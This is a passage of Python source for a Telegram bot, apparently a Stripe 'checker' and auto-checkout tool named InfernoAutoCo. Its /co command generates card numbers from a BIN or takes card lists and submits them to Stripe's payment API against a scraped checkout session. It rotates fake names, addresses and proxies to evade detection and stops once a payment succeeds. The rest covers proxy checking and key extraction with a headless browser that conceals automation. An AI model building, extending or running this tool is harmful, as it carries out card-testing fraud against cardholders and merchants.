        bot.reply_to(message, f"{E['cross']} Error: {str(e)}\n———————————————", parse_mode='HTML')

@bot.message_handler(commands=['saveproxies'])
def save_proxies_command(message):
    try:
        save_proxies_to_file()
        bot.reply_to(
            message,
            f"{E['gift']} Saved {len(loaded_proxies)} proxies to {PROXY_FILE}\n———————————————",
            parse_mode='HTML'
        )
    except Exception as e:
        bot.reply_to(message, f"{E['cross']} Error: {str(e)}\n———————————————", parse_mode='HTML')

# ==========================================
# PROXY CHECKER COMMANDS
# ==========================================

@bot.message_handler(commands=['checkproxy'])
def check_single_proxy_command(message):
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(
                message,
                f"""{E['warn']} Usage: /checkproxy [proxy]

Example: /checkproxy 192.168.1.1:8080

Formats:
• host:port
• user:pass@host:port
• host:port:user:pass
———————————————""",
                parse_mode='HTML'
            )
            return
        
        proxy_str = parts[1].strip()
        proxy_dict = validate_proxy(proxy_str)
        
        if not proxy_dict:
            bot.reply_to(
                message,
                f"{E['cross']} Invalid proxy format.\n———————————————",
                parse_mode='HTML'
            )
            return
        
        status_msg = bot.reply_to(message, f"{E['loading']} Checking proxy...", parse_mode='HTML')
        
        result = check_single_proxy(proxy_dict)
        
        if result['working']:
            response = f"{E['check']} Proxy is WORKING\n"
            response += f"Host: {proxy_dict['host']}:{proxy_dict['port']}\n"
            response += f"Response Time: {result['response_time']:.2f}s\n"
            response += f"Status Code: {result['status_code']}\n"
            if result.get('ip'):
                response += f"IP: {result['ip']}\n"
            response += "\n✅ Proxy is good to use"
        else:
            response = f"{E['cross']} Proxy is DEAD\n"
            response += f"Host: {proxy_dict['host']}:{proxy_dict['port']}\n"
            response += f"Error: {result['error'] or 'Unknown error'}\n"
            response += "\n❌ Proxy is not working"
        
        response += "\n———————————————"
        bot.edit_message_text(
            response,
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            parse_mode='HTML'
        )
        
    except Exception as e:
        bot.reply_to(message, f"{E['cross']} Error: {str(e)}\n———————————————", parse_mode='HTML')

@bot.message_handler(commands=['checkproxies'])
def check_multiple_proxies_command(message):
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(
                message,
                f"""{E['warn']} Usage: /checkproxies [proxy1, proxy2, ...]

Example: /checkproxies 192.168.1.1:8080, 192.168.1.2:8080
———————————————""",
                parse_mode='HTML'
            )
            return
        
        proxy_strs = parts[1].strip()
        proxy_list = re.split(r'[,;\n\r\s]+', proxy_strs)
        proxy_list = [p.strip() for p in proxy_list if p.strip()]
        
        valid_proxies = []
        invalid = []
        for p in proxy_list:
            proxy_dict = validate_proxy(p)
            if proxy_dict:
                valid_proxies.append(proxy_dict)
            else:
                invalid.append(p)
        
        if not valid_proxies:
            bot.reply_to(
                message,
                f"{E['cross']} No valid proxies found.\n———————————————",
                parse_mode='HTML'
            )
            return
        
        status_msg = bot.reply_to(
            message,
            f"{E['loading']} Checking {len(valid_proxies)} proxies with {CHECK_THREADS} threads...",
            parse_mode='HTML'
        )
        
        results = check_proxies_batch(valid_proxies)
        
        working_count = len([r for r in results if r['working']])
        dead_count = len([r for r in results if not r['working']])
        
        response = f"{E['target']} Proxy Check Results\n"
        response += f"Total: {len(results)} | ✅ Working: {working_count} | ❌ Dead: {dead_count}\n"
        response += "———————————————\n\n"
        
        if working_count > 0:
            response += f"{E['check']} Working Proxies ({working_count}):\n"
            working_results = [r for r in results if r['working']]
            for r in working_results[:10]:
                proxy = r['proxy']
                response += f"• {proxy['host']}:{proxy['port']} ({r['response_time']:.2f}s)\n"
            if working_count > 10:
                response += f"... and {working_count - 10} more\n"
            response += "\n"
        
        if dead_count > 0:
            response += f"{E['cross']} Dead Proxies ({min(dead_count, 5)} shown):\n"
            dead_results = [r for r in results if not r['working']]
            for r in dead_results[:5]:
                proxy = r['proxy']
                error = r.get('error', 'Unknown')
                response += f"• {proxy['host']}:{proxy['port']} - {error[:30]}\n"
            if dead_count > 5:
                response += f"... and {dead_count - 5} more\n"
        
        if invalid:
            response += f"\n{E['warn']} Invalid proxies: {len(invalid)}\n"
        
        response += "\n———————————————"
        
        bot.edit_message_text(
            response,
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            parse_mode='HTML'
        )
        
    except Exception as e:
        bot.reply_to(message, f"{E['cross']} Error: {str(e)}\n———————————————", parse_mode='HTML')

@bot.message_handler(commands=['proxytxt'])
def check_proxies_from_file_command(message):
    try:
        if not os.path.exists(PROXY_FILE):
            bot.reply_to(
                message,
                f"{E['cross']} File not found: {PROXY_FILE}\nPlease create the file first.\n———————————————",
                parse_mode='HTML'
            )
            return
        
        status_msg = bot.reply_to(
            message,
            f"{E['loading']} Scanning proxies from {PROXY_FILE}...\nThis may take a moment...",
            parse_mode='HTML'
        )
        
        with open(PROXY_FILE, 'r', encoding='utf-8', errors='ignore') as f:
            total_lines = sum(1 for line in f if line.strip() and not line.startswith('#'))
        
        bot.edit_message_text(
            f"{E['loading']} Checking {total_lines} proxies from {PROXY_FILE}\nUsing {CHECK_THREADS} threads...",
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            parse_mode='HTML'
        )
        
        working, dead = check_proxies_from_file(PROXY_FILE)
        
        saved = save_working_proxies(working)
        
        response = f"{E['shield']} Proxy File Scan Complete\n"
        response += f"File: {PROXY_FILE}\n"
        response += f"Total Proxies: {len(working) + len(dead)}\n"
        response += f"{E['check']} Working: {len(working)}\n"
        response += f"{E['cross']} Dead: {len(dead)}\n"
        response += f"{E['gift']} Saved working: {saved} to {WORKING_PROXY_FILE}\n"
        response += "———————————————\n\n"
        
        if working:
            response += f"{E['check']} Working Proxies ({len(working)}):\n"
            for r in working[:15]:
                proxy = r['proxy']
                response += f"• {proxy['host']}:{proxy['port']} ({r['response_time']:.2f}s)\n"
            if len(working) > 15:
                response += f"... and {len(working) - 15} more\n"
        else:
            response += f"{E['cross']} No working proxies found.\n"
        
        response += "\n———————————————"
        response += f"\n{E['info']} Use /loadworking to load working proxies into memory."
        
        bot.edit_message_text(
            response,
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            parse_mode='HTML'
        )
        
    except Exception as e:
        bot.reply_to(message, f"{E['cross']} Error: {str(e)}\n———————————————", parse_mode='HTML')

@bot.message_handler(commands=['loadworking'])
def load_working_proxies_command(message):
    try:
        if not os.path.exists(WORKING_PROXY_FILE):
            bot.reply_to(
                message,
                f"{E['cross']} File not found: {WORKING_PROXY_FILE}\nRun /proxytxt first.\n———————————————",
                parse_mode='HTML'
            )
            return
        
        count = 0
        with proxy_lock:
            loaded_proxies.clear()
            
            with open(WORKING_PROXY_FILE, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        proxy_dict = validate_proxy(line)
                        if proxy_dict:
                            loaded_proxies.append(proxy_dict)
                            count += 1
        
        save_proxies_to_file()
        
        bot.reply_to(
            message,
            f"{E['check']} Loaded {count} working proxies\n"
            f"Source: {WORKING_PROXY_FILE}\n"
            f"Total proxies in memory: {len(loaded_proxies)}\n"
            "———————————————",
            parse_mode='HTML'
        )
        
    except Exception as e:
        bot.reply_to(message, f"{E['cross']} Error: {str(e)}\n———————————————", parse_mode='HTML')

@bot.message_handler(commands=['cleanproxies'])
def clean_dead_proxies_command(message):
    try:
        with proxy_lock:
            if not loaded_proxies:
                bot.reply_to(
                    message,
                    f"{E['warn']} No proxies in memory.\n———————————————",
                    parse_mode='HTML'
                )
                return
            
            total = len(loaded_proxies)
            proxies_to_check = loaded_proxies.copy()
        
        status_msg = bot.reply_to(
            message,
            f"{E['loading']} Checking {total} proxies in memory...",
            parse_mode='HTML'
        )
        
        results = check_proxies_batch(proxies_to_check)
        
        working = [r for r in results if r['working']]
        dead = [r for r in results if not r['working']]
        
        with proxy_lock:
            loaded_proxies.clear()
            for r in working:
                loaded_proxies.append(r['proxy'])
        
        save_proxies_to_file()
        
        response = f"{E['shield']} Proxy Cleanup Complete\n"
        response += f"Total checked: {total}\n"
        response += f"{E['check']} Working kept: {len(working)}\n"
        response += f"{E['cross']} Dead removed: {len(dead)}\n"
        response += f"Proxies remaining: {len(loaded_proxies)}\n"
        response += "———————————————"
        
        bot.edit_message_text(
            response,
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            parse_mode='HTML'
        )
        
    except Exception as e:
        bot.reply_to(message, f"{E['cross']} Error: {str(e)}\n———————————————", parse_mode='HTML')

# ==========================================
# PROXY HELP COMMAND
# ==========================================

@bot.message_handler(commands=['proxyhelp'])
def proxy_help_command(message):
    text = f"""{E['bolt']} Proxy Management Commands

ADD COMMANDS (Auto-Check):
{E['plus']} /addproxy [proxy] - Add & check single proxy
{E['plus']} /addproxies [proxy1, ...] - Add & check multiple

REMOVE COMMANDS:
{E['minus']} /removeproxy [index] - Remove proxy by index
{E['minus']} /removeproxies [index1, ...] - Remove multiple
{E['stop']} /clearproxies - Remove ALL proxies

CHECK COMMANDS:
{E['target']} /checkproxy [proxy] - Check single proxy
{E['target']} /checkproxies [proxy1, ...] - Check multiple
{E['shield']} /proxytxt - Check all from proxies.txt
{E['gift']} /loadworking - Load working proxies
{E['refresh']} /cleanproxies - Check & remove dead

LIST & STATS:
{E['globe']} /listproxies [page] - List all proxies
{E['bank']} /proxycount - Show statistics
{E['refresh']} /rotateproxy - Force rotate proxy
{E['gift']} /saveproxies - Save to file

Proxy Formats:
• host:port
• user:pass@host:port
• host:port:user:pass

Files:
• {PROXY_FILE} - Main proxy list
• {WORKING_PROXY_FILE} - Working proxies

———————————————"""
    bot.reply_to(message, text, parse_mode='HTML')

# ==========================================
# MAIN COMMANDS (START, HELP, INFO)
# ==========================================

@bot.message_handler(commands=['start'])
def start_command(message):
    try:
        text = f"""{E['bolt']}{E['bolt']}{E['bolt']} InfernoAutoCo v10.0 - ULTIMATE EDITION

{E['sparkle']} Ultimate Stripe Checker with Address Rotation

{E['rocket']} Checkout:
• /co [url] [cards/bin] - Smart checkout with 100+ addresses

{E['shield']} Proxy Checker:
• /checkproxy [proxy] - Check single proxy
• /proxytxt - Check all from file

{E['globe']} Proxy Management:
• /proxyhelp - Full proxy guide
• /addproxy [proxy] - Add with auto-check
• /listproxies - List all proxies

{E['info']} Info:
• /help - Show help
• /info - Bot information

{E['address']} Address Rotation: 100+ addresses
{E['person']} Name Rotation: 100+ names

———————————————
{E['gem']} Powered by CAT Shadow Hacker"""
        bot.reply_to(message, text, parse_mode='HTML')
    except Exception as e:
        bot.reply_to(message, f"{E['cross']} Error: {str(e)}", parse_mode='HTML')

@bot.message_handler(commands=['help'])
def help_command(message):
    try:
        text = f"""{E['bolt']} InfernoAutoCo v10.0 - Help

CHECKOUT:
/co [url] [cards/bin] - Smart checkout
    • Auto-detects dead checkout pages
    • Stops on successful payment
    • 100+ random addresses per card
    • 100+ random cardholder names
    • 3D Secure detection

PROXY CHECKER:
/checkproxy [proxy] - Check single proxy
/checkproxies [proxy1, ...] - Check multiple
/proxytxt - Check proxies from file
/loadworking - Load working proxies
/cleanproxies - Remove dead proxies

PROXY MANAGEMENT:
/addproxy [proxy] - Add with auto-check
/addproxies [proxy1, ...] - Add multiple
/removeproxy [index] - Remove by index
/removeproxies [index1, ...] - Remove multiple
/clearproxies - Remove all
/listproxies [page] - List all
/proxycount - Statistics
/rotateproxy - Rotate proxy
/saveproxies - Save to file
/proxyhelp - Full proxy guide

INFO:
/info - Bot information

———————————————"""
        bot.reply_to(message, text, parse_mode='HTML')
    except Exception as e:
        bot.reply_to(message, f"{E['cross']} Error: {str(e)}", parse_mode='HTML')

@bot.message_handler(commands=['info'])
def info_command(message):
    try:
        text = f"""{E['bolt']}{E['bolt']}{E['bolt']} InfernoAutoCo v10.0

{E['check']} Status: 🟢 Online
{E['rocket']} Mode: Ultimate Smart Checkout
{E['cc']} Max Cards: {MAX_CARDS}
{E['refresh']} Retries: {MAX_RETRIES}
{E['hourglass']} Timeout: {REQUEST_TIMEOUT}s

{E['address']} Address Rotation: 100+ addresses
{E['person']} Name Rotation: 100+ names
{E['flag']} Countries: {len(ADDRESSES)}

{E['shield']} Proxy Checker:
• Threads: {CHECK_THREADS}
• Check Timeout: {CHECK_TIMEOUT}s

{E['globe']} Proxies Loaded: {len(loaded_proxies)}
{E['bank']} Proxy File: {PROXY_FILE}
{E['gift']} Working File: {WORKING_PROXY_FILE}

{E['gem']} Engine: ShadowMew Ultimate Edition
{E['star']} License: Eternal

———————————————"""
        bot.reply_to(message, text, parse_mode='HTML')
    except Exception as e:
        bot.reply_to(message, f"{E['cross']} Error: {str(e)}", parse_mode='HTML')

# ==========================================
# UPDATED: create_payment_method WITH ADDRESS ROTATION
# ==========================================

def create_payment_method(cc: str, mm: str, yy: str, cvv: str, pk_live: str, 
                          muid: str, guid: str, sid: str, cs_live: str, 
                          ccode: str = "US") -> requests.Response:
    logger.info(f"Creating payment method for card ending in {cc[-4:]}")
    
    # Generate random address and name for this card
    address = get_random_address(ccode)
    name = get_random_name()
    email = get_random_email(name)
    
    logger.info(f"Using name: {name}, address: {address['street']}, {address['city']}")
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://checkout.stripe.com',
        'pragma': 'no-cache',
        'referer': 'https://checkout.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': USER_AGENT,
    }
    
    cc = cc.replace(" ", "").replace("-", "")
    
    if len(yy) == 2:
        yy = "20" + yy
    if len(mm) == 1:
        mm = "0" + mm
    
    client_session_id = str(uuid.uuid4())
    
    # Format address for URL encoding
    street_encoded = address['street'].replace(' ', '+')
    city_encoded = address['city'].replace(' ', '+')
    state_encoded = address.get('state', '').replace(' ', '+')
    zip_encoded = address['zip'].replace(' ', '+')
    country_encoded = address['country']
    name_encoded = name.replace(' ', '+')
    email_encoded = email.replace('+', '%40')  # @ symbol
    
    data = (
        f'type=card'
        f'&card[number]={cc}'
        f'&card[cvc]={cvv}'
        f'&card[exp_month]={mm}'
        f'&card[exp_year]={yy}'
        f'&billing_details[name]={name_encoded}'
        f'&billing_details[email]={email_encoded}'
        f'&billing_details[address][country]={country_encoded}'
        f'&billing_details[address][line1]={street_encoded}'
        f'&billing_details[address][city]={city_encoded}'
        f'&billing_details[address][postal_code]={zip_encoded}'
        f'&billing_details[address][state]={state_encoded}'
        f'&guid={guid}'
        f'&muid={muid}'
        f'&sid={sid}'
        f'&key={pk_live}'
        f'&payment_user_agent=stripe.js%2Ff197c9c0f0%3B+stripe-js-v3%2Ff197c9c0f0%3B+checkout'
        f'&client_attribution_metadata[client_session_id]={client_session_id}'
        f'&client_attribution_metadata[checkout_session_id]={cs_live}'
        f'&client_attribution_metadata[merchant_integration_source]=checkout'
        f'&client_attribution_metadata[merchant_integration_version]=hosted_checkout'
        f'&client_attribution_metadata[payment_method_selection_flow]=automatic'
    )
    
    proxy = get_proxy_with_fallback()
    
    for attempt in range(MAX_RETRIES):
        try:
            response = requests.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                data=data,
                proxies=proxy,
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:
                logger.info(f"Payment method created with name: {name}, city: {address['city']}")
            return response
        except Exception as e:
            logger.warning(f"PM creation attempt {attempt+1} failed: {e}")
            if attempt < MAX_RETRIES - 1:
                time.sleep(2 ** attempt)
    
    return requests.Response()

# ==========================================
# SMART CHECKOUT COMMAND
# ==========================================

@bot.message_handler(commands=['co'])
def checkout_command(message):
    start_time = time.time()
    try:
        uid = message.from_user.id
        requester_name = message.from_user.username or message.from_user.first_name or "User"
        
        parts = message.text.split(maxsplit=2)
        if len(parts) < 3:
            bot.reply_to(
                message, 
                f"""{E['warn']} Usage: /co [url] [cards/bin]

Examples:
/co https://checkout... 534348|12|2028|627
/co https://checkout... 534348
———————————————""",
                parse_mode='HTML'
            )
            return
        
        checkout_url = parts[1]
        input_data = parts[2].strip()
        
        status_msg = bot.reply_to(message, f"{E['loading']} Processing...\n\n{E['info']} Step 1: Checking checkout health...", parse_mode='HTML')
        
        # === STEP 1: EXTRACT KEYS ===
        try:
            pk_live, cs_live, page_source = extract_stripe_keys(checkout_url)
        except Exception as e:
            bot.edit_message_text(
                f"{E['cross']} Key Extraction Failed\n\n{E['alert']} {str(e)}\n\n{E['info']} The checkout page may be invalid or unreachable.\n\n{E['network']} Tip: Check your proxy connection.\n———————————————",
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                parse_mode='HTML'
            )
            return

        # === STEP 2: CHECKOUT HEALTH CHECK ===
        is_healthy, health_msg, session_info = check_checkout_health(checkout_url, pk_live, cs_live)
        
        if not is_healthy:
            bot.edit_message_text(
                f"{E['dead']} CHECKOUT PAGE IS DEAD\n\n{health_msg}\n\n{E['stop']} Stopping further processing.\n———————————————",
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                parse_mode='HTML'
            )
            return
        
        # Update status with health info
        bot.edit_message_text(
            f"{E['check']} Checkout is HEALTHY\n\n{health_msg}\n\n{E['loading']} Step 2: Preparing cards with address rotation...",
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            parse_mode='HTML'
        )
        
        # === STEP 3: GET FINGERPRINT ===
        muid, guid, sid = get_muid_guid()
        session_info['muid'] = muid
        session_info['guid'] = guid
        session_info['sid'] = sid

        # === STEP 4: CURRENCY OPTIMIZATION ===
        if session_info.get('currency', 'usd').lower() != 'usd':
            bot.edit_message_text(
                f"{E['refresh']} Optimizing: Switching to USD...",
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                parse_mode='HTML'
            )
            
            new_init, new_curr = init_payment_session(pk_live, cs_live, currency_override='usd')
            if new_init:
                session_info = parse_init_response(new_init)
                session_info['pk_live'] = pk_live
                session_info['cs_live'] = cs_live
                session_info['muid'] = muid
                session_info['guid'] = guid
                session_info['sid'] = sid
        
        # === STEP 5: PREPARE CARDS ===
        cards = []
        if is_bin_input(input_data):
            bin_part, fixed_month, fixed_year = parse_bin_input(input_data)
            cards = generate_cards_from_bin(bin_part, fixed_month, fixed_year, MAX_CARDS)
        else:
            if ',' in input_data:
                cards = [c.strip() for c in input_data.split(',') if c.strip()]
            elif '|' in input_data:
                cards = [input_data]
            else:
                bin_part, fixed_month, fixed_year = parse_bin_input(input_data)
                cards = generate_cards_from_bin(bin_part, fixed_month, fixed_year, MAX_CARDS)
        
        cards = cards[:MAX_CARDS]
        
        if not cards:
            bot.edit_message_text(
                f"{E['cross']} Error: No valid cards generated\n———————————————",
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                parse_mode='HTML'
            )
            return
        
        # === STEP 6: PROCESS CARDS WITH SMART STOP ===
        card_logs = []
        total_cards = len(cards)
        processed_cards = 0
        payment_successful = False
        checkout_dead = False
        stop_reason = ""
        http_error_count = 0
        
        for i, card in enumerate(cards, 1):
            if payment_successful or checkout_dead:
                break
            
            # Show which card we're processing
            bot.edit_message_text(
                f"{E['loading']} Processing card {i}/{total_cards}...\n{E['address']} Using random address & name...\n{E['network']} Using proxy rotation...",
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                parse_mode='HTML'
            )
            
            result = process_card(card, session_info)
            processed_cards = i
            
            # === CHECK FOR HTTP ERRORS ===
            if result['code'] == 'http_error':
                http_error_count += 1
                if http_error_count >= 3:
                    checkout_dead = True
                    stop_reason = f"{E['alert']} TOO MANY HTTP ERRORS\n\n{E['network']} 3 consecutive HTTP errors detected.\n\n{E['info']} Possible causes:\n• Bad proxies\n• Network issues\n• Stripe API down\n\n{E['retry']} Try again with fresh proxies."
                    break
                else:
                    rotate_proxy()
                    logger.info(f"HTTP error on card {i}, rotating proxy. Attempt {http_error_count}/3")
                    processed_cards = i - 1
                    time.sleep(1)
                    continue
            
            # === CHECK FOR DEAD CHECKOUT ===
            if result['status'] == 'expired' or 'no longer active' in result.get('message', '').lower():
                checkout_dead = True
                stop_reason = f"{E['dead']} CHECKOUT PAGE DIED DURING PROCESSING\n\n{E['alert']} {result['message']}\n\n{E['stop']} Stopped after {processed_cards-1} cards."
                break
            
            # === CHECK FOR SUCCESSFUL PAYMENT ===
            if result['status'] == 'live' or 'succeeded' in result.get('message', '').lower():
                payment_successful = True
                result['amount_display'] = session_info.get('amount_display', '$0.00')
                stop_reason = f"{E['gem']} PAYMENT SUCCESSFUL!\n\n{E['money']} Amount: {result.get('amount_display', '$0.00')}\n{E['check']} Card #{i} is LIVE\n\n{E['stop']} Stopped processing after successful payment."

            log_block = format_card_log(i, card, result)
            card_logs.append(log_block)
            
            # Update progress with status
            try:
                status_text = f"{E['loading']} Processing cards... ({i}/{total_cards})"
                if payment_successful:
                    status_text = f"{E['gem']} SUCCESS! 🎉"
                elif checkout_dead:
                    status_text = f"{E['dead']} CHECKOUT DIED"
                
                current_text = create_result_text(
                    session_info, total_cards, processed_cards, 
                    card_logs, requester_name, uid,
                    payment_successful, checkout_dead, stop_reason
                )
                bot.edit_message_text(
                    current_text,
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    parse_mode='HTML'
                )
            except Exception as e:
                logger.warning(f"Message update error: {e}")
                time.sleep(0.5)
        
        # === STEP 7: FINAL RESULT ===
        elapsed = time.time() - start_time
        final_text = create_result_text(
            session_info, total_cards, processed_cards, 
            card_logs, requester_name, uid,
            payment_successful, checkout_dead, stop_reason
        )
        final_text += f"\n{E['hourglass']} Time: {elapsed:.1f}s"
        
        # Add summary banner
        if payment_successful:
            final_text = f"{E['gem']}{E['gem']}{E['gem']} 💰 PAYMENT SUCCESSFUL! 💰 {E['gem']}{E['gem']}{E['gem']}\n\n" + final_text
        elif checkout_dead:
            final_text = f"{E['dead']}{E['dead']}{E['dead']} 💀 CHECKOUT DIED 💀 {E['dead']}{E['dead']}{E['dead']}\n\n" + final_text
        
        bot.edit_message_text(
            final_text,
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            parse_mode='HTML'
        )
        
    except Exception as e:
        error_msg = f"{E['cross']} Error: {str(e)}\n———————————————\n{traceback.format_exc()[:200]}"
        try:
            bot.edit_message_text(
                error_msg,
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                parse_mode='HTML'
            )
        except:
            bot.reply_to(message, error_msg, parse_mode='HTML')
        logger.error(f"Error in /co: {traceback.format_exc()}")

# ==========================================
# UPDATED: format_card_log WITH 3D SECURE
# ==========================================

def format_card_log(index: int, card_data: str, result: Dict) -> str:
    """Format card result - handles all inputs including 3D Secure"""
    try:
        parts = card_data.split("|")
        
        if len(parts) == 4:
            cc, mm, yy, cvv = parts
        elif len(parts) == 3:
            cc = parts[0]
            mm = parts[1] if parts[1] else "??"
            yy = parts[2] if parts[2] else "??"
            cvv = "???"
        elif len(parts) == 1:
            cc = parts[0]
            mm = "??"
            yy = "??"
            cvv = "???"
        else:
            cc = card_data[:16] if len(card_data) >= 16 else card_data
            mm = "??"
            yy = "??"
            cvv = "???"
    except Exception as e:
        logger.warning(f"Card parsing error: {e} for data: {card_data}")
        cc = card_data[:16] if len(card_data) >= 16 else card_data
        mm = "??"
        yy = "??"
        cvv = "???"
    
    card_type = get_card_type_emoji(cc)
    status_emoji = get_status_emoji(result['status'])
    
    error_code = result.get('code', 'unknown_error')
    status_display = "❌ DECLINED"
    status_desc = ""
    
    # Check for 3D Secure first
    if '3d_secure' in error_code or '3D SECURE' in result.get('message', ''):
        status_display = "🔐 3D SECURE"
        status_desc = "📱 Card requires OTP/PIN verification"
        status_emoji = "🔐"
    
    elif result['status'] == 'live':
        status_display = "✅ LIVE"
        status_desc = "💎 Card is valid and payment succeeded!"
    
    elif error_code == 'succeeded':
        status_display = "✅ SUCCEEDED"
        status_desc = "💎 Payment was successful!"
    
    elif error_code == 'expired_session':
        status_display = "⏳ SESSION EXPIRED"
        status_desc = "⚠️ Checkout link is no longer active"
    
    elif error_code == 'http_error':
        status_display = "🌐 HTTP ERROR"
        status_desc = "📶 Network/Proxy issue - retrying..."
    
    elif error_code == 'no_pm_id':
        status_display = "⚠️ PM CREATION FAILED"
        status_desc = "❌ Could not create payment method"
    
    elif error_code == 'exception':
        status_display = "💥 EXCEPTION"
        status_desc = "🔧 Internal error occurred"
    
    elif error_code == 'unknown_error':
        status_display = "❌ DECLINED"
        status_desc = f"❌ {result.get('message', 'Unknown error')}"
    
    else:
        status_desc = f"❌ {result.get('message', 'Unknown error')}"
    
    if result['status'] == 'live':
        return f"""{R['cc']} Card #{index} {card_type}
{cc}|{mm}|{yy}|{cvv}
{R['price']} Amount: {result.get('amount_display', '$0.00')}
{status_emoji} Status: {status_display}
💬 {status_desc}
{E['hourglass']} Time: {result['time']}
———————————————"""
    else:
        return f"""{R['cc']} Card #{index} {card_type}
{cc}|{mm}|{yy}|{cvv}
{status_emoji} Status: {status_display} [{error_code}]
💬 {status_desc}
{E['hourglass']} Time: {result['time']}
———————————————"""

def create_result_text(session_info: Dict, total_cards: int, processed_cards: int, 
                       card_logs: List[str], requester_name: str, requester_id: int,
                       payment_successful: bool = False, checkout_dead: bool = False,
                       stop_reason: str = "") -> str:
    """Create formatted result text with smart status"""
    header = f"""{E['bolt']}{E['bolt']}{E['bolt']} InfernoAutoCo v10.0 - ULTIMATE
—  —  —  —  —
{R['gate']} Site: {session_info.get('site_name', 'Unknown')}
{E['link']} URL: {session_info.get('site_url', 'Unknown')}
{R['price']} Amount: {session_info.get('amount_display', '$0.00')}
{R['cc']} Cards: {total_cards}
{E['address']} Address Rotation: ✅ Active
{E['person']} Name Rotation: ✅ Active
———————————————

"""
    
    body = "\n".join(card_logs)
    
    # Status indicator
    status_line = ""
    if payment_successful:
        status_line = f"\n{E['gem']}{E['gem']}{E['gem']} 💰 PAYMENT SUCCESSFUL! 💰 {E['gem']}{E['gem']}{E['gem']}\n"
    elif checkout_dead:
        status_line = f"\n{E['dead']}{E['dead']}{E['dead']} 💀 CHECKOUT DIED 💀 {E['dead']}{E['dead']}{E['dead']}\n"
    
    footer = f"""{E['dice']} Processed: {processed_cards}/{total_cards}
{E['user']} Req By: @{requester_name}
{E['gem']} Powered by 🐱 Shadow Hacker"""
    
    if stop_reason:
        footer = f"{E['alert']} {stop_reason}\n\n" + footer
    
    return header + status_line + body + footer

def get_card_type_emoji(card_number: str) -> str:
    if not card_number:
        return "💳"
    first_digit = card_number[0]
    if first_digit == '4':
        return "💳 Visa"
    elif first_digit == '5':
        return "💳 Master"
    elif first_digit == '3' and len(card_number) >= 2:
        if card_number[:2] in ['34', '37']:
            return "💳 Amex"
    return "💳"

def get_status_emoji(status: str) -> str:
    if status == 'live':
        return E["check"]
    elif status == 'expired':
        return E["hourglass"]
    elif status == 'dead':
        return E["cross"]
    elif status == 'success':
        return E["gem"]
    elif status == 'error':
        return E["alert"]
    return E["warn"]

def detect_3d_secure(error_msg: str) -> bool:
    keywords = [
        "pin code", "3d secure", "3ds", "authentication required",
        "verify your identity", "otp", "one time password",
        "verified by visa", "mastercard securecode",
        "american express safekey", "challenge required",
        "additional authentication", "bank verification",
        "card verification", "security check", "sms verification"
    ]
    error_lower = error_msg.lower()
    return any(keyword in error_lower for keyword in keywords)

# ==========================================
# STRIPE FUNCTIONS
# ==========================================

def extract_stripe_keys(url: str) -> Tuple[str, str, str]:
    driver = None
    try:
        logger.info(f"Extracting keys from: {url}")
        from selenium import webdriver
        from selenium.webdriver.firefox.options import Options as FirefoxOptions
        from selenium.webdriver.firefox.service import Service as FirefoxService
        
        options = FirefoxOptions()
        firefox_path = get_firefox_path()
        if firefox_path:
            options.binary_location = firefox_path
        
        options.add_argument("--headless")
        options.add_argument("--width=1920")
        options.add_argument("--height=1080")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.set_preference("dom.webdriver.enabled", False)
        options.set_preference("useAutomationExtension", False)
        
        os.environ["MOZ_HEADLESS"] = "1"
        
        service = FirefoxService(get_geckodriver_path())
        driver = webdriver.Firefox(service=service, options=options)
        driver.set_page_load_timeout(30)
        driver.get(url)
        time.sleep(3)
        
        page_source = driver.page_source
        
        patterns = [
            r'pk_live_[a-zA-Z0-9]{24,}',
            r'pk_test_[a-zA-Z0-9]{24,}',
            r'pk_[a-zA-Z0-9]{24,}',
            r'apiKey[=:][\'\"]?(pk_live_[a-zA-Z0-9]+)',
            r'data-publishable-key="(pk_live_[^"]+)"',
        ]
        
        pk_match = None
        for pattern in patterns:
            match = re.search(pattern, page_source)
            if match:
                pk_match = match
                break
        
        cs_patterns = [
            r'cs_live_[a-zA-Z0-9]{24,}',
            r'cs_test_[a-zA-Z0-9]{24,}',
            r'data-session-id="(cs_live_[^"]+)"',
            r'sessionId[=:][\'\"]?(cs_live_[a-zA-Z0-9]+)',
        ]
        
        cs_match = None
        for pattern in cs_patterns:
            match = re.search(pattern, page_source)
            if match:
                cs_match = match
                break
        
        if not pk_match or not cs_match:
            scripts = re.findall(r'<script[^>]*>(.*?)</script>', page_source, re.DOTALL | re.IGNORECASE)
            for script in scripts:
                if not pk_match:
                    pk_match = re.search(r'pk_(?:live|test)_[a-zA-Z0-9]{24,}', script)
                if not cs_match:
                    cs_match = re.search(r'cs_(?:live|test)_[a-zA-Z0-9]{24,}', script)
                if pk_match and cs_match:
                    break
        
        if not pk_match or not cs_match:
            raise ValueError("Could not find Stripe keys in page")
        
        pk_live = pk_match.group(0).strip('\'"')
